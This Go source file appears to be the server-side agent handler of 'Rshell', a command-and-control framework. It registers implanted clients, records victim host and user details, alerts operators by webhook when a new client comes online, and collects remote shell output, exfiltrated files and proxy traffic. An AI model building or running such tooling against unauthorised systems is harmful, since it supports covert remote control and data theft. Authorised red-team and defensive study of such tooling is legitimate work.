package base

import (
	"Rshell/pkg/command"
	"Rshell/pkg/connection"
	"Rshell/pkg/database"
	"Rshell/pkg/encrypt"
	"Rshell/pkg/interactive"
	"Rshell/pkg/logger"
	"Rshell/pkg/qqwry"
	"Rshell/pkg/utils"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"Rshell/pkg/webhooks"
)

// SafeSplitOSInfo safely splits an OS info string into hostname, username, process name.
func SafeSplitOSInfo(osInfo string) (hostName, userName, processName string) {
	if osInfo == "" {
		return "Unknown", "Unknown", "Unknown"
	}
	parts := strings.SplitN(osInfo, "\t", 3)
	switch len(parts) {
	case 3:
		return parts[0], parts[1], parts[2]
	case 2:
		return parts[0], parts[1], "Unknown"
	case 1:
		return parts[0], "Unknown", "Unknown"
	default:
		return "Unknown", "Unknown", "Unknown"
	}
}

// FirstBloodParams holds parameters for registering a new client.
type FirstBloodParams struct {
	UID          string
	Metainfo     []byte
	ConnType     string // tcp, websocket, kcp, oss
	ExternalIP   string // pre-resolved external IP, or "oss上线" for OSS
	LocalIP      string
	ProcessID    uint32
	Flag         int
	PublicKey    []byte
	RemoteAddr   net.Addr // for logging
}

// RegisterClient parses FirstBlood metainfo, creates DB records, and sends webhook.
func RegisterClient(p *FirstBloodParams) error {
	metainfo := p.Metainfo
	if len(metainfo) < 9 {
		return fmt.Errorf("metainfo too short for parsing: %d bytes", len(metainfo))
	}

	publicKey := metainfo[:32]
	metainfo = metainfo[32:]
	processID := binary.BigEndian.Uint32(metainfo[:4])
	flag := int(metainfo[4])

	if len(metainfo) < 9 {
		return fmt.Errorf("metainfo too short for IP parsing: %d bytes", len(metainfo))
	}

	ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
	localIP := utils.Uint32ToIP(ipInt).String()

	var osInfo string
	if len(metainfo) > 9 {
		osInfo = string(metainfo[9:])
	}

	hostName, userName, processName := SafeSplitOSInfo(osInfo)

	arch := "x86"
	if flag > 8 {
		userName += "*"
		flag = flag - 8
	}
	if flag > 4 {
		arch = "x64"
	}

	currentTime := time.Now()
	formattedTime := currentTime.Format("01-02 15:04")

	c := database.Clients{
		Uid:        p.UID,
		FirstStart: formattedTime,
		ExternalIP: p.ExternalIP,
		InternalIP: localIP,
		Username:   userName,
		Computer:   hostName,
		Process:    processName,
		Pid:        strconv.Itoa(int(processID)),
		Address:    resolveAddress(p.ExternalIP),
		Arch:       arch,
		Note:       "",
		Sleep:      defaultSleep(p.ConnType),
		Online:     "1",
		Color:      "",
		PublicKey:  base64.StdEncoding.EncodeToString(publicKey[:]),
	}
	encrypt.PublicKeyMap[p.UID] = base64.StdEncoding.EncodeToString(publicKey[:])

	// Insert into database
	if _, err := database.Engine.Insert(&c); err != nil {
		logger.Error("Failed to insert client:", err)
		return err
	}
	database.Engine.Insert(&database.Shell{Uid: p.UID, ShellContent: ""})
	database.Engine.Insert(&database.Notes{Uid: p.UID, Note: ""})

	// Send webhook notification
	go webhooks.NotifyOnline(c)

	logger.Info(fmt.Sprintf("New %s client registered: %s IP: %s", p.ConnType, p.UID, p.ExternalIP))
	return nil
}

// RegisterClientWithTx is like RegisterClient but uses a database transaction.
func RegisterClientWithTx(p *FirstBloodParams) error {
	metainfo := p.Metainfo
	if len(metainfo) < 9 {
		return fmt.Errorf("metainfo too short for parsing: %d bytes", len(metainfo))
	}

	publicKey := metainfo[:32]
	metainfo = metainfo[32:]
	processID := binary.BigEndian.Uint32(metainfo[:4])
	flag := int(metainfo[4])

	if len(metainfo) < 9 {
		return fmt.Errorf("metainfo too short for IP parsing: %d bytes", len(metainfo))
	}

	ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
	localIP := utils.Uint32ToIP(ipInt).String()

	var osInfo string
	if len(metainfo) > 9 {
		osInfo = string(metainfo[9:])
	}

	hostName, userName, processName := SafeSplitOSInfo(osInfo)

	arch := "x86"
	if flag > 8 {
		userName += "*"
		flag = flag - 8
	}
	if flag > 4 {
		arch = "x64"
	}

	currentTime := time.Now()
	formattedTime := currentTime.Format("01-02 15:04")

	c := database.Clients{
		Uid:        p.UID,
		FirstStart: formattedTime,
		ExternalIP: p.ExternalIP,
		InternalIP: localIP,
		Username:   userName,
		Computer:   hostName,
		Process:    processName,
		Pid:        strconv.Itoa(int(processID)),
		Address:    resolveAddress(p.ExternalIP),
		Arch:       arch,
		Note:       "",
		Sleep:      defaultSleep(p.ConnType),
		Online:     "1",
		Color:      "",
		PublicKey:  base64.StdEncoding.EncodeToString(publicKey[:]),
	}
	encrypt.PublicKeyMap[p.UID] = base64.StdEncoding.EncodeToString(publicKey[:])

	session := database.Engine.NewSession()
	defer session.Close()

	if err := session.Begin(); err != nil {
		return fmt.Errorf("begin transaction failed: %w", err)
	}

	if _, err := session.Insert(&c); err != nil {
		session.Rollback()
		return fmt.Errorf("insert client failed: %w", err)
	}
	if _, err := session.Insert(&database.Shell{Uid: p.UID, ShellContent: ""}); err != nil {
		session.Rollback()
		return fmt.Errorf("insert shell failed: %w", err)
	}
	if _, err := session.Insert(&database.Notes{Uid: p.UID, Note: ""}); err != nil {
		session.Rollback()
		return fmt.Errorf("insert notes failed: %w", err)
	}
	if err := session.Commit(); err != nil {
		return fmt.Errorf("commit transaction failed: %w", err)
	}

	go webhooks.NotifyOnline(c)
	logger.Info(fmt.Sprintf("New %s client registered: %s IP: %s", p.ConnType, p.UID, p.ExternalIP))
	return nil
}

func resolveAddress(externalIP string) string {
	if externalIP == "oss上线" {
		return "oss上线"
	}
	addr, _ := qqwry.GetLocationByIP(externalIP)
	return addr
}

func defaultSleep(connType string) string {
	if connType == "oss" {
		return "5"
	}
	return "0"
}

// ReconnectClient updates an existing client's online status.
func ReconnectClient(uid string) {
	database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "1"})
	logger.Info("Client reconnected:", uid)
}

// ReplyHandler dispatches reply-type messages from agents.
type ReplyHandler struct {
	UID string
}

func (h *ReplyHandler) Handle(replyType uint32, data []byte) {
	switch replyType {
	case 0: // shell output
		h.updateShell(data, false)
	case 31: // error output
		h.updateShell(data, true)
	case command.PS:
		if len(data) > 0 {
			command.AddPid(h.UID, string(data))
		}
	case command.FileBrowse:
		if len(data) > 0 {
			command.AddFileBrowser(h.UID, string(data))
		}
	case 22: // file download start info
		h.handleFileDownloadStart(data)
	case command.DOWNLOAD: // file download chunk
		h.handleFileDownload(data)
	case command.DRIVES:
		if len(data) > 0 {
			drives := utils.GetExistingDrives(data)
			command.AddDrives(h.UID, drives)
		}
	case command.FileContent:
		h.handleFileContent(data)
	case command.Socks5Data:
		if len(data) < 16 {
			logger.Error("Socks5 data too short")
			break
		}
		md5sign := data[:16]
		rawData := data[16:]
		command.AddSocks5(h.UID, fmt.Sprintf("%x", md5sign), string(rawData))
	case command.WriteInteractieShell:
		sessionIDLen := int(binary.BigEndian.Uint32(data[:4]))
		sessionID := string(data[4 : 4+sessionIDLen])
		output := data[4+sessionIDLen:]
		interactive.SendOutputToSession(h.UID, sessionID, output)
	default:
		logger.Warn("Unknown reply type:", replyType)
	}
}

func (h *ReplyHandler) updateShell(data []byte, isError bool) {
	var shell database.Shell
	if _, err := database.Engine.Where("uid = ?", h.UID).Get(&shell); err == nil {
		var content string
		if isError {
			if len(data) > 10000 {
				content = string(data[:10000]) + "\n[Data truncated...]"
			} else {
				content = string(data)
			}
			shell.ShellContent += "!Error: " + content + "\n"
		} else {
			if len(data) > 10000 {
				content = string(data[:10000]) + "\n[Data truncated...]"
			} else {
				content = string(data) + "\n"
			}
			shell.ShellContent += content
		}
		database.Engine.Where("uid = ?", h.UID).Update(&shell)
	}
}

func (h *ReplyHandler) handleFileDownloadStart(data []byte) {
	if len(data) < 8 {
		logger.Error("File download info too short")
		return
	}
	fileLen := int(binary.BigEndian.Uint32(data[:4]))
	if len(data) < 5 {
		logger.Error("No file path in download info")
		return
	}
	filePath := string(data[4:])
	if filePath == "" || fileLen <= 0 {
		logger.Error("Invalid file download info")
		return
	}

	fullPath, err := utils.GetSafeFilePath(h.UID, filePath)
	if err != nil {
		logger.Error("Security check failed:", err)
		return
	}

	downloadDir := filepath.Dir(fullPath)
	if err := os.MkdirAll(downloadDir, 0755); err != nil {
		logger.Error("Failed to create download directory:", err)
		return
	}

	sql := `UPDATE downloads SET file_size = ?, downloaded_size = ? WHERE uid = ? AND file_path = ?;`
	if _, err := database.Engine.QueryString(sql, fileLen, 0, h.UID, filePath); err != nil {
		logger.Error("Database update failed:", err)
	}

	if _, err := os.Stat(fullPath); err == nil {
		if err := os.Remove(fullPath); err != nil {
			logger.Error("Failed to remove existing file:", err)
			return
		}
	}

	fp, err := os.OpenFile(fullPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
	if err != nil {
		logger.Error("Failed to create file:", err)
		return
	}
	fp.Close()
}

func (h *ReplyHandler) handleFileDownload(data []byte) {
	if len(data) < 8 {
		logger.Error("Download data too short")
		return
	}
	filePathLen := int(binary.BigEndian.Uint32(data[:4]))
	if len(data) < 4+filePathLen || filePathLen == 0 {
		logger.Error("Invalid file path length in download")
		return
	}

	filePath := string(data[4 : 4+filePathLen])
	fileContent := data[4+filePathLen:]

	fullPath, err := utils.GetSafeFilePath(h.UID, filePath)
	if err != nil {
		logger.Error("Security check failed:", err)
		return
	}

	utils.Filelock.Lock()
	var fileDownloads database.Downloads
	if _, err := database.Engine.Where("uid = ? AND file_path = ?", h.UID, filePath).Get(&fileDownloads); err == nil {
		fileDownloads.DownloadedSize += len(fileContent)
		database.Engine.Where("uid = ? AND file_path = ?", h.UID, filePath).Update(&fileDownloads)
	}
	utils.Filelock.Unlock()

	downloadDir := filepath.Dir(fullPath)
	if err := os.MkdirAll(downloadDir, 0755); err != nil {
		logger.Error("Failed to create download directory:", err)
		return
	}

	fp, err := os.OpenFile(fullPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		logger.Error("Failed to open file:", err)
		return
	}
	defer fp.Close()

	if _, err := fp.Write(fileContent); err != nil {
		logger.Error("Failed to write file content:", err)
	}
}

func (h *ReplyHandler) handleFileContent(data []byte) {
	if len(data) < 8 {
		logger.Error("File content data too short")
		return
	}
	filePathLen := int(binary.BigEndian.Uint32(data[:4]))
	if len(data) < 4+filePathLen || filePathLen == 0 {
		logger.Error("Invalid file path length in file content")
		return
	}
	filePath := string(data[4 : 4+filePathLen])
	fileContent := data[4+filePathLen:]
	command.AddFileContent(h.UID, filePath, string(fileContent))
}

// ClientCloser provides a common close pattern for transport clients.
type ClientCloser struct {
	UID         string
	ConnType    string // "tcp", "websocket", "kcp", "oss"
	IsClosed    bool
	CloseMu     sync.Mutex
	Conn        Closable
	StopChan    chan struct{}
	UpdateDB    func(uid string)        // called to update DB status
	UpdateCache func(uid string)        // called to update transport-specific cache
}

type Closable interface {
	Close() error
}

// Close safely closes the client connection and updates DB.
func (c *ClientCloser) Close() {
	c.CloseMu.Lock()
	if c.IsClosed {
		c.CloseMu.Unlock()
		return
	}
	c.IsClosed = true
	c.CloseMu.Unlock()

	if c.StopChan != nil {
		close(c.StopChan)
	}
	if c.Conn != nil {
		c.Conn.Close()
	}
	if c.UpdateCache != nil {
		c.UpdateCache(c.UID)
	}
	if c.UpdateDB != nil {
		c.UpdateDB(c.UID)
	}
	logger.Info(fmt.Sprintf("%s connection closed for client: %s", c.ConnType, c.UID))
}

// MarkOffline updates the client's online status to offline.
func MarkOffline(uid string) {
	connection.GlobalManager.SetListenerType(uid, "")
	connection.GlobalManager.DeleteListenerType(uid)
	database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "2"})
	logger.Info("Client marked as offline:", uid)
}

// HeartbeatChecker manages heartbeat timeout detection.
type HeartbeatChecker struct {
	UID           string
	LastHeartbeat *time.Time
	TimeoutCount  *int
	IsClosed      *bool
	StopChan      <-chan struct{}
	OnTimeout     func() // called when max timeouts reached
	MaxTimeouts   int
	CheckInterval time.Duration
	TimeoutLimit  time.Duration
}

// Start runs the heartbeat checker in a goroutine.
func (h *HeartbeatChecker) Start() {
	go h.run()
}

func (h *HeartbeatChecker) run() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("Heartbeat checker panic recovered:", r)
		}
	}()

	if h.MaxTimeouts == 0 {
		h.MaxTimeouts = 3
	}
	if h.CheckInterval == 0 {
		h.CheckInterval = 10 * time.Second
	}
	if h.TimeoutLimit == 0 {
		h.TimeoutLimit = 30 * time.Second
	}

	ticker := time.NewTicker(h.CheckInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if *h.IsClosed {
				return
			}
			if time.Since(*h.LastHeartbeat) > h.TimeoutLimit {
				*h.TimeoutCount++
				logger.Warn("Heartbeat timeout for client:", h.UID, "Timeout count:", *h.TimeoutCount)
				if *h.TimeoutCount >= h.MaxTimeouts {
					logger.Info("Max heartbeat timeout reached, closing connection for client:", h.UID)
					if h.OnTimeout != nil {
						h.OnTimeout()
					}
					return
				}
			}
		case <-h.StopChan:
			return
		}
	}
}
